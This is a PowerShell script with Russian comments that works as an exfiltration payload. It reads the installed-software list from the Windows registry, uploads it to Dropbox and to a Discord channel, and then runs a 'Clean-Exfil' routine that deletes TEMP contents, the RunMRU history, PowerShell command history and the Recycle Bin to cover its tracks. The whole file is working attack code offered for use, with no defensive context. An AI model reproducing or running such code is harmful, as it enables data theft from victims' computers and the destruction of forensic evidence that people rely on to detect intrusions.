# Получаем список установленных приложений из реестра Windows
$appList = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation | Sort-Object DisplayName

# Сохраняем список приложений в файл с именем "app-list.txt" в папку TEMP
$appList | Out-File -Encoding ascii "$env:TEMP/app-list.txt"

# Функция для загрузки файла в Dropbox
function Upload-ToDropbox {
    param (
        [Parameter(Mandatory = $true)]
        [string]$SourceFile,
        [Parameter(Mandatory = $true)]
        [string]$TargetPath,
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    $Headers = @{
        Authorization = "Bearer $Token"
        "Dropbox-API-Arg" = '{"path": "' + $TargetPath + '", "mode": "add", "autorename": true, "mute": false}'
        "Content-Type" = "application/octet-stream"
    }
    
    Invoke-RestMethod -Method Post -Uri "https://content.dropboxapi.com/2/files/upload" -InFile $SourceFile -Headers $Headers
}

# Функция для отправки сообщения в Discord
function Send-ToDiscord {
    param (
        [Parameter(Mandatory = $true)]
        [string]$WebhookUrl,
        [Parameter(Mandatory = $false)]
        [string]$Message,
        [Parameter(Mandatory = $false)]
        [string]$File
    )

    $Body = @{
        content = $Message
    }

    if ($File) {
        $Headers = @{ Authorization = "Bot $WebhookUrl" }
        $Uri = "https://discord.com/api/v9/channels/$WebhookUrl/messages"
        $Response = Invoke-RestMethod -Method Post -Uri $Uri -Headers $Headers -ContentType "multipart/form-data" -Body @{ file1 = Get-Item $File -Force -ErrorAction Stop }
    }

    Invoke-WebRequest -Method Post -Uri $WebhookUrl -ContentType "application/json" -Body ($Body | ConvertTo-Json)
}

# Если определены переменные "db" и "dc", вызываем функции загрузки файла в Dropbox и отправки сообщения в Discord
if ($db -and $dc) {
    $DropboxToken = $db
    $SourceFile = "$env:TEMP/app-list.txt"
    $TargetPath = "/app-list.txt"

    Upload-ToDropbox -SourceFile $SourceFile -TargetPath $TargetPath -Token $DropboxToken
    Send-ToDiscord -WebhookUrl $dc -Message "App list attached." -File $SourceFile
}

# Функция "Clean-Exfil" очищает шлейфы информации о том, что было сделано во время скрипта
function Clean-Exfil {
    # Удаляем содержимое папки TEMP
    Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

    # Удаляем историю запуска приложений из реестра Windows
    Remove-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Force -ErrorAction SilentlyContinue

    # Удаляем историю команд PowerShell
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Очищаем корзину
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Если определена переменная "ce", вызываем функцию "Clean-Exfil"
if ($ce) {
    Clean-Exfil
}

# Удаляем файл с именем "app-list.txt" из папки TEMP
Remove-Item "$env:TEMP/app-list.txt" -ErrorAction SilentlyContinue
